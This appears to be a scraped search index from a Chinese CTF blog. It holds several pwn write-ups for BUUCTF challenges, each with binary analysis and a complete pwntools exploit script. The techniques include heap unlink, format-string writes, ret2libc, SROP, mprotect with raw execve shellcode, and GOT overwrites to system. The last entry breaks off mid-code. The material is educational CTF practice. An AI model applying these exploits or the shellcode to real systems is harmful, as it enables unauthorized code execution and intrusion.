= 0x6020c8 add(0x80, b\u0026#34;0\u0026#34;) add(0x80, b\u0026#34;1\u0026#34;) add(0x80, b\u0026#34;/bin/sh\\x00\\x00\u0026#34;) payload = (pg(0) + pg(0x80) + pg(ptr - 0x18) + pg(ptr - 0x10)).ljust(0x80, b\u0026#34;\\x00\u0026#34;) + pg(0x80) + pg(0x90) change(0, payload) remove(1) payload = b\u0026#34;\\x00\u0026#34;*0x10 + pg(0x80) + pg(m_elf.got[\u0026#39;atoi\u0026#39;]) change(0, payload) libcbase = u64(show(0).ljust(8, b\u0026#34;\\x00\u0026#34;)) - libc.sym[\u0026#39;atoi\u0026#39;] success(f\u0026#34;libcbase =\u0026gt; {hex(libcbase)}\u0026#34;) system_addr = libcbase + libc.sym[\u0026#39;system\u0026#39;] change(0, pg(system_addr)) p.sendlineafter(b\u0026#34;Your choice:\u0026#34;, b\u0026#34;/bin/sh\\x00\u0026#34;) p.clean() p.interactive() ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/unlinkbuuctf-hitcontraining_unlink/","section":"writeup","summary":"原题链接 checksec查看程序架构 ida查看伪代码 典型的堆菜单题 介绍一下unlink unlink其实就是很普通，很常规的一种从双向链表中取出节点的机","tags":["pwn","unlink","堆"],"title":"【unlink】BUUCTF hitcontraining_unlink"},{"categories":["writeup"],"contents":"原题链接\nchecksec查看程序架构 ida查看程序伪代码 构建exp ASLR对栈的影响 构建地址链 爆破 完整exp checksec查看程序架构 $ checksec xman_2019_format [*] \u0026#39;/home/giantbranch/share_files/security/workspace/xman_2019_format/xman_2019_format\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) ida查看程序伪代码 整个程序反编译出来逻辑非常混乱，但重要的只有三个函数： 有一个后门函数\n【HarekazeCTF2019】baby_rop.md babyheap_0ctf_2017.md ciscn_2019_en_2.md ciscn_2019_es_2.md ciscn_2019_ne_5.md ciscn_s_3.md get_started_3dsctf_2016.md jarvisoj_fm.md jarvisoj_level2_x64.md not_the_same_3dsctf_2016.md others_shellcode.md pwn2_sctf_2016.md xman_2019_format.md 暨南大学2022新生赛初赛 非官方WriteUp.md\n这个函数说明了buf也就是保存字符串的地址在堆中\n这个函数说明会将buf中的字符串以|为分割符分割成多个子字符串并打印\n这个程序因为只有一次输入的机会，而且无法更改ret值，所以获取shell权限要一次到位地完成，因此虽然可以泄露栈地址却难以加以利用。\n因此如果我们要更改栈地址，就需要用到爆破\n构建exp ASLR对栈的影响 首先，每次加载程序的时候，栈基址都是不一样的，但是后12位为0\n其次，因为页对齐的影响，因此栈地址除了栈基址还要加上一个页地址，这个页地址一定是4KB的整数倍，也就是说，这个页地址对最后12位是没有影响的\n然后，栈地址还要加上一个偏移，这个偏移会对栈地址后12位造成影响，经过调试发现，同一个地址在每次运行的时候，最后4位也就是地址的最后一个16进制数是不变的\n且看下述程序：\n#include\u0026lt;stdio.h\u0026gt; int main(void){ int a = 1; printf(\u0026#34;%p\\n\u0026#34;, \u0026amp;a); return 0; } 运行结果：\n可以看到，对于64位程序，栈地址也是只有最后一位不变\n我们再来看下32位程序的情况：\n结论和64位程序是一样的\n笔者也不知道产生此现象的根本原因，只能当作一个既定事实记了。如果有师傅知道此现象的原因，希望能在评论区留下您的解释，感谢您的付出！\n笔者猜测原因：每次程序开始时会保证栈地址最后一位为0，这样经过既定数量的pop和push，在同一个相对位置的栈地址的最后一位是不变的\n构建地址链 如图，如果我们用%hhn将ebp位置指向的地址改为ret地址，那么0xffffd3b8保存的地址就是ret地址，这样子我们就可以通过第三个红框框这条链来更改ret地址了\n爆破 上述逻辑有一个问题，就是我们需要更改栈地址的末一个字节，而这个字节的高四位是不确定的，所以我们如果更改，则只有$\\frac{1}{16}$的几率成功，那么我们就加一个while循环多试几次就好了\n完整exp from pwn import * from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher import sys pss: bool = False fn: str = \u0026#34;./xman_2019_format\u0026#34; libc_name: str = \u0026#34;./libc-2.23.so\u0026#34; port: str = \u0026#34;28711\u0026#34; if_32: bool = False pg = p32 if if_32 else p64 context(arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal=[\u0026#39;tmux\u0026#39;,\u0026#39;splitw\u0026#39;,\u0026#39;-h\u0026#39;] if_debug: bool = False m_elf = ELF(fn) libc = ELF(libc_name) backdoor = 0x80485AB offset1 = 10 len1 = 0x6c offset2 = 18 len2 = 0x85AB format_string = f\u0026#39;%{len1}c%{offset1}$hhn|%{len2}c%{offset2}$hn\u0026#39; success(format_string) while(True): if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;b* 0x400BA1\u0026#34;,) else: p = process(fn, env={\u0026#34;LD_PRELOAD\u0026#34;: libc_name}) p.clean() p.send(format_string) gdb.attach(p, \u0026#34;b* 0x804860B\u0026#34;) p.clean() try: p.interactive() except: info(\u0026#34;failed!\u0026#34;) p.close() ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/%E7%88%86%E7%A0%B4%E6%A0%88%E6%9C%AB%E4%BD%8Dxman_2019_format/","section":"writeup","summary":"原题链接 checksec查看程序架构 ida查看程序伪代码 构建exp ASLR对栈的影响 构建地址链 爆破 完整exp checksec查看程序架构 $ checksec xman_2019_format [*] \u0026#39;/home/giantbranch/share_files/security/workspace/xman_2019_format/xman_2019_format\u0026#39; Arch: i386-32-little","tags":["pwn","爆破栈末位"],"title":"【爆破栈末位】xman_2019_format"},{"categories":["writeup"],"contents":"原题链接\nchecksec查看程序架构 ida查看程序伪代码 构建exp 符号位溢出 ret2libc 完整exp checksec查看程序架构 $ checksec --file ./pwn2_sctf_2016 [*] \u0026#39;/home/peterl/security/workspace/pwn2_sctf_2016/pwn2_sctf_2016\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) ida查看程序伪代码 我们发现第一次输入的数字决定了第二次输入的字符个数，但是必须小于32，而我们查看过栈情况后发现32个字符是不够的\n然后我们发现get_n的第二个参数的类型为unsigned int：\n那么我们可以考虑符号位漏洞\n构建exp 符号位溢出 我们知道，在计算机中负数是由补码机制表示的 （还有另一种不流行的表示方法，就是把第一位作为符号位，1表示负，0表示正，剩下的位表示数字的绝对值，但这样会产生-0和+0两个0），也就是说，原本如果不考虑负数，我们可以表示0~0xffffffff的正数，但是现在我们把它对半分，用后面那一节表示负数，那么这个数轴就变成了：\n0x80000000 ~ 0xffffffff 0 0x1 ~ 0x7fffffff $-2^{31}$ ~ $-1$ $0$ $1$ ~ $2^{31}-1$ 但是如果我们在C语言中进行数字的比较时，我们是比较的它们逻辑上的值，也就是-1 \u0026lt; 32，尽管-1在计算机内部的数值是大于32的（因为负数实际的值一定是大于等于0x80000000的，所以负数的第一位一定是1，而正数的第一位一定是0，这样我们就可以通过第一位来判断数字的正负了）\n如果我们将-1强制转换为无符号整数，那么它负数的属性就消失了，它逻辑上就是$2^{32}-1$\n这种逻辑上的不一致就产生了符号位漏洞\nret2libc 这题最无语的是它提供了一个do_thing函数：\n我还以为是要用syscall做，浪费了好多时间找能改变eax、ebx、ecx、edx的gadget，结果找了一圈就是没有能改eax的，后来无奈只能用ret2libc做\n这个程序有printf函数，我们通过printf函数泄露基址就好了\n完整exp 需要注意的是，这题的libc在libcdatabase是搜不到的，因此用不了libcsearcher\n可以去BUUCTF的FQA专栏找libc的下载地址\nfrom pwn import * from pwn import p64, p32, u32, u64 # from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./pwn2_sctf_2016\u0026#34; libc_name: str = \u0026#34;./libc-2.23.so\u0026#34; port: str = \u0026#34;\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;b* 0x80485B7\u0026#34;) else: p = process(fn) m_elf = ELF(fn) libc = ELF(libc_name) p.clean() p.sendline(b\u0026#34;-1\u0026#34;) p.clean() payload = b\u0026#34;a\u0026#34;*(0x2C + 0x4) + pg(m_elf.plt[\u0026#39;printf\u0026#39;]) + pg(m_elf.sym[\u0026#39;vuln\u0026#39;]) + pg(m_elf.got[\u0026#39;printf\u0026#39;]) p.sendline(payload) p.recvuntil(b\u0026#39;\\n\u0026#39;) printf_addr = u32(p.recv(4)) success(hex(printf_addr)) base_addr = printf_addr - libc.sym[\u0026#39;printf\u0026#39;] system_addr: int = base_addr + libc.sym[\u0026#39;system\u0026#39;] exit_addr: int = base_addr + libc.sym[\u0026#39;exit\u0026#39;] bin_sh_addr: int = base_addr + next(libc.search(b\u0026#34;/bin/sh\u0026#34;)) success(hex(base_addr)) p.clean() p.sendline(b\u0026#34;-1\u0026#34;) p.clean() ret: int = 0x08048346 payload = b\u0026#34;a\u0026#34;*(0x2C + 0x4) + \\ pg(system_addr) + pg(exit_addr) + pg(bin_sh_addr) p.sendline(payload) p.clean() p.interactive() ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/%E7%AC%A6%E5%8F%B7%E4%BD%8D%E6%BC%8F%E6%B4%9E+ret2libcpwn2_sctf_2016/","section":"writeup","summary":"原题链接 checksec查看程序架构 ida查看程序伪代码 构建exp 符号位溢出 ret2libc 完整exp checksec查看程序架构 $ checksec --file ./pwn2_sctf_2016 [*] \u0026#39;/home/peterl/security/workspace/pwn2_sctf_2016/pwn2_sctf_2016\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX","tags":["pwn","符号位漏洞","ret2libc"],"title":"【符号位漏洞+ret2libc】pwn2_sctf_2016"},{"categories":["writeup"],"contents":"原题链接\nchecksec查看程序架构 ida查看程序伪代码 构建exp 格式化字符串覆盖任意地址数据 完整exp checksec查看程序架构 $ checksec fm [*] \u0026#39;/home/peterl/security/workspace/fm/fm\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 有canary，那传统的栈溢出肯定不行了\nida查看程序伪代码 我们发现，如果我们想要运行system(\u0026quot;/bin/sh)就必须让x等于4。但是我们点进x看一下，发现它是一个等于3的全局变量（要是保存在.rodata节就寄了）：\n我们看一下程序代码，发现这么两行：\nread(0, buf, 0x50u); printf(buf); 直接打印我们输入的字符串，立马想到格式化字符串（所以绝对不能太过相信用户的输入……）\n构建exp 格式化字符串覆盖任意地址数据 这种方法基于：\nformat字符串会被保存在栈中 %n可以使用 我们首先要找到这个format字符串数据和esp的偏移，我们先输入一大串a，等到call printf的时候查看栈：\n我们看到栈顶前两个数据分别是format字符串和第1个参数，因此我们可以知道我们输入的字符串保存在第11个参数的位置，因此偏移就是11\n那么我们就可以构造我们的格式化字符串了：\n我们的目的是向我们输入的地址处写入数据4，而我们输入的地址是保存在第十一个参数的位置的，而且刚刚好32位的地址占用四个字节，所以：\npayload = pg(0x804a02c) + b\u0026#34;%11$n\u0026#34; 如果想把地址放在后面，因为\u0026quot;%11$n\u0026quot;占用5个字符，为了输入4我们需要在其前面填充4个字符，所以现在一共占用9个字符，我们可以通过填充3个垃圾数据让它占用达到12个字符，让我们的地址在第14个参数的位置：\npayload = b\u0026#34;aaaa%14$n!!!\u0026#34; + pg(0x804a02c) 我们也可以用pwntools提供的自动化工具：\n# 第一个参数是偏移量，也就是11 # 第二个参数是一个字典，key为需要更改的变量（函数）地址，val为需要更改的值 payload = fmtstr_payload(11, {0x804A02C: 0x4}) 完整exp from pwn import * from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher pss: bool = False fn: str = \u0026#34;./fm\u0026#34; libc_name:str = \u0026#34;/lib/i386-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;break main\u0026#34;) else: p = process(fn,env={\u0026#34;LD_PRELOAD\u0026#34;:libc_name}) p.clean() payload = fmtstr_payload(11, {0x804A02C: 0x4}) p.sendline(payload) p.clean() p.interactive() ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9Ejarvisoj_fm/","section":"writeup","summary":"原题链接 checksec查看程序架构 ida查看程序伪代码 构建exp 格式化字符串覆盖任意地址数据 完整exp checksec查看程序架构 $ checksec fm [*] \u0026#39;/home/peterl/security/workspace/fm/fm\u0026#39; Arch: i386-32-little RELRO: Partial","tags":["pwn","格式化字符串漏洞"],"title":"【格式化字符串漏洞】jarvisoj_fmm"},{"categories":["writeup"],"contents":"原题链接\nchecksec查看程序架构 ida查看程序伪代码 构建exp 完整exp checksec查看程序架构 $ checksec --file ciscn_s_3 [*] \u0026#39;/home/peterl/security/workspace/ciscn_s_3/ciscn_s_3\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) ida查看程序伪代码 这里有两个syscall用于读写，已经很明显地暗示要用syscall了\n接下来它又提供了一个gadget函数，明显是要为sig_return做好前置工作（设置RAX）\n那么我们的思路就很简单了，先调用sig_return，这样它就会把接下来我们安排在栈上的上下文作为接下来要恢复的上下文，这样我们就可以安排系统的寄存器了\n构建exp 首先第一次运行的时候会打印出来rbp的地址，为了让程序再运行一遍，我们将ret地址设置为vul函数的地址：\nstack_offset = -0x118 write_offset = 0x20 p.clean() p.send(b\u0026#34;a\u0026#34;*0x10 + pg(m_elf.sym[\u0026#39;vuln\u0026#39;])) p.recv(write_offset) bin_bash_addr = u64(p.recv(8)) + stack_offset 通过调试时的偏移计算，我们就获得了栈地址\n然后我们就可以通过pwntools的自动化工具构建sig_return后恢复的上下文了\nsig_ret_gadget = 0x4004DA syscall_ret = 0x400517 # 使用pwntools的自动化工具构建我们想要的上下文 frame = SigreturnFrame() frame.rax = constants.SYS_execve frame.rdi = bin_bash_addr frame.rsi = 0 frame.rdx = 0 frame.rip = syscall_ret success(str(frame)) 然后按sig_return+上下文的格式发过去就可以了：\np.send(b\u0026#34;/bin/sh\\x00\u0026#34;*0x2 + pg(sig_ret_gadget) + pg(syscall_ret) \\ + bytes(frame)) 完整exp from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./ciscn_s_3\u0026#34; libc_name:str = \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;28554\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;break main\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) stack_offset = -0x118 write_offset = 0x20 p.clean() p.send(b\u0026#34;a\u0026#34;*0x10 + pg(m_elf.sym[\u0026#39;vuln\u0026#39;])) p.recv(write_offset) bin_bash_addr = u64(p.recv(8)) + stack_offset p.clean() sig_ret_gadget = 0x4004DA syscall_ret = 0x400517 # 使用pwntools的自动化工具构建我们想要的上下文 frame = SigreturnFrame() frame.rax = constants.SYS_execve frame.rdi = bin_bash_addr frame.rsi = 0 frame.rdx = 0 frame.rip = syscall_ret success(str(frame)) p.send(b\u0026#34;/bin/sh\\x00\u0026#34;*0x2 + pg(sig_ret_gadget) + pg(syscall_ret) \\ + bytes(frame)) p.clean() p.interactive() ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/%E5%9F%BA%E7%A1%80sropsig_returnciscn_s_3/","section":"writeup","summary":"原题链接 checksec查看程序架构 ida查看程序伪代码 构建exp 完整exp checksec查看程序架构 $ checksec --file ciscn_s_3 [*] \u0026#39;/home/peterl/security/workspace/ciscn_s_3/ciscn_s_3\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) i","tags":["pwn","基础SROP","sig_return"],"title":"【基础SROP】【sig_return】ciscn_s_3"},{"categories":["writeup"],"contents":"题目链接\n查看程序架构 不是动态链接程序\nida查看伪代码 解法一 该题没有system也没有/bin/sh，也不能ret2libc，也没有syscall，但是可以利用int 80h来原始地调用0xb号系统调用（execve） 因为长度限制为100，所以无法利用ropper或ROPgadget自动生成的ropchain（太长了），所以需要手写ropchain来添加利用率更高的gadget\n#!/usr/bin/python2 #coding=utf-8 from pwn import * from LibcSearcher import * context(os = \u0026#34;linux\u0026#34;, arch = \u0026#34;i386\u0026#34;, log_level= \u0026#34;debug\u0026#34;) p = remote(\u0026#34;node3.buuoj.cn\u0026#34;, 28443) read_addr = 0x0806cd50 int_80 = 0x080493e1 pop_eax_ret = 0x080bae06 pop_edx_ecx_eax_ret = 0x0806e850 bss_addr = 0x080eb584 payload = \u0026#34;a\u0026#34; * 0x20 + p32(read_addr) payload += p32(pop_edx_ecx_eax_ret)\t# 平衡栈空间 payload += p32(0) + p32(bss_addr) + p32(8)\t# read函数的三个参数 payload += p32(pop_eax_ret) + p32(0x0b)\t# 对eax进行赋值 # 对edx、ecx、ebx进行赋值 payload += p32(pop_edx_ecx_eax_ret) + p32(0) + p32(0) + p32(bss_addr) payload += p32(int_80) p.sendlineafter(\u0026#34;:\u0026#34;, payload) p.sendline(\u0026#34;/bin/sh\\x00\u0026#34;) p.sendline(\u0026#34;cat flag\u0026#34;) p.interactive() 解法二 调用mprotect函数设置一段内存的可执行权限，然后写入shellcode 需要注意的是mprotect参数中内存的起始地址需要是页大小的整数倍，也就是说末三位需要是0\n# 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher import ctypes pss: bool = False fn: str = \u0026#34;./simplerop\u0026#34; libc_name:str = \u0026#34;\u0026#34; port: str = \u0026#34;25133\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* 0x80EAF85 c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) # libc = ELF(libc_name) def suclog(**kwargs): for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = False) -\u0026gt; bytes: if until is not None: p.recvuntil(flat(until)) received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) return received def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = False) -\u0026gt; bytes: send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = False): received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... offset: int = 0x18 + 8 pop_edx_ecx_ebx_ret = 0x0806e850 bss = 0x80EB000 ret = 0x080481b2 payload = flat({offset:[ m_elf.sym[\u0026#39;mprotect\u0026#39;], pop_edx_ecx_ebx_ret, bss, 0x1000, 0b111, m_elf.sym[\u0026#39;read\u0026#39;], pop_edx_ecx_ebx_ret, 0, bss, 0x100, bss ]}) sendline_after_clean(payload) # sleep(0.1) shellcode_32 = b\u0026#39;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80\u0026#39; sendline_after_clean(flat(shellcode_32)) # sleep(0.1) # payload = flat({offset:bss}) # sendline_after_clean(payload) interactive_after_clean() ","date":"2022年12月29日","permalink":"https://peterliuzhi.top/writeup/%E5%88%A9%E7%94%A8int-80h%E5%88%A9%E7%94%A8mprotect%E5%87%BD%E6%95%B0buuctf-cmcc_simplerop/","section":"writeup","summary":"题目链接 查看程序架构 不是动态链接程序 ida查看伪代码 解法一 该题没有system也没有/bin/sh，也不能ret2libc，也没有syscall，但是","tags":["pwn","利用mprotect函数","利用int 80h"],"title":"【利用int 80h】【利用mprotect函数】BUUCTF cmcc_simplerop"},{"categories":["writeup"],"contents":"原题链接\n查看程序架构 ida伪代码 可以看到是标准的菜单堆题\nallocate 这里自定义了结构体 在ends处按d新建域，光标在具体的域上按d会清空 这个函数就是一个结构体申请了两片内存：\n结构体固有的0x80字节的内存，第一个域是存放第二片内存的指针，第二个域用于存放一个name 第二片内存的大小是任意的，但是这里它限制ptr_content + input_size的值不能大于第一个域的内存地址 因为ptr_content的内存先申请，name的内存后申请，所以在没有free的情况下，ptr_content的内存地址总是小于name的并且紧密相连的，所以这个检测总是能够保证不溢出的 这里明显有一个漏洞，因为我们可以通过将两块内存free到unsorted bin中，再申请一块大小等于两块内存大小之和的内存作为ptr_content的地址，这样name申请的内存地址就会从top_chunk中切出，两者中间的一串chunk就都可以溢出了 remove 用不了UAF，也不能通过free到unsorted bin中获取libc\nshow 可以将ptr_content的值改为free的got值，然后就能获得free的地址了\nchange 只更新ptr_content里的值\nexp 通过溢出改变ptr_content的值为free_got，然后show出free的地址，计算得到system地址，改变free_got值为system地址即可\n# 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher import ctypes pss: bool = True fn: str = \u0026#34;./babyfengshui_33c3_2016\u0026#34; libc_name: str = \u0026#34;/home/giantbranch/share/share_files/security/buuctf_libc/libc-2.23_32.so\u0026#34; port: str = \u0026#34;27439\u0026#34; if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn, env=env) # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) def suclog(**kwargs): for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True) -\u0026gt; bytes: if until is not None: p.recvuntil(flat(until)) received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) return received def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True) -\u0026gt; bytes: send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: 